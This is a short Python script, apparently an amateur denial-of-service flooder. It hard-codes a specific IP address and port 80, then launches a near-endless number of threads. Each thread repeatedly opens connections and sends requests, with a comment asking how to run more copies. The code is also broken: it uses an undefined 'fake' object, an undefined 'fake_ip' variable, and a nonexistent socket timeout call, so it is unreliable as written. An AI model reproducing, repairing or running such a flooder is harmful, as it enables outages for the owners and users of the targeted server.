from faker import Faker
import socket
import threading

#find a way to open multiple of these in python script 

target = '154.0.172.181'
port = 80


def generate_random_ip():
    return fake.ipv4()

 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        randomip = generate_random_ip()
       
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.timeout(0.5)
        s.close()



for i in range(10000000000000):
    thread = threading.Thread(target=attack)
    thread.start()
    
